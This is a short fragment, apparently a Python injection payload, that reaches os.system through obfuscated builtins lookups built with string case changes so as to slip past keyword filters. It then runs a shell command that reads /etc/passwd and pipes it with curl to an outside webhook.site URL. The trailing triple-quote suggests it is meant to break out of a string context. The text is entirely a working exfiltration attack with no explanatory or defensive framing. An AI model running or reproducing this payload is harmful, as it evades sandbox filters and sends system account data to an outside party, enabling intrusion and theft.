...
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /etc/passwd | curl -X GET --data-binary @- https://webhook.site/c2ee487b-1429-416a-bdef-2f824cdb00d1?')
"""
